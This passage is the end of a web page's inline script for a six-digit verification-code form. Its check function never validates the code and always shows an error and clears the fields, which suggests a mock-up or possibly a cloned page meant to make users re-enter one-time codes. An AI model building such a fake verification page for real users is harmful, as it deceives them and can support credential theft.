    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            
            if (e.target.value.length > 1) {
                e.target.value = e.target.value.slice(-1);
            }

            if (errorBanner.style.display === 'flex') {
                 errorBanner.style.display = 'none';
                 document.querySelectorAll('.frMiBK').forEach(el => el.classList.remove('input-error'));
            }

            if (e.target.value.length === 1) {
                if (index < inputs.length - 1) {
                    inputs[index + 1].focus();
                } else {
                    input.blur(); 
                    verificarCodigo(); 
                }
            }
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                inputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const pasteData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
            if (pasteData) {
                inputs.forEach((inp, i) => {
                    if (pasteData[i]) inp.value = pasteData[i];
                });
                if (pasteData.length >= 6) {
                    document.activeElement.blur();
                    verificarCodigo();
                } else {
                   const lastIndex = Math.min(pasteData.length, inputs.length) - 1;
                   if (lastIndex >= 0) inputs[lastIndex].focus();
                }
            }
        });
    });

    function triggerError() {
        errorBanner.style.display = 'flex';
        document.querySelectorAll('.frMiBK').forEach(el => el.classList.add('input-error'));
        inputs.forEach(inp => inp.value = '');
        inputs[0].focus();
    }


    function verificarCodigo() {
        setTimeout(() => {
            triggerError();
        }, 300);
    }
</script>
</body></html>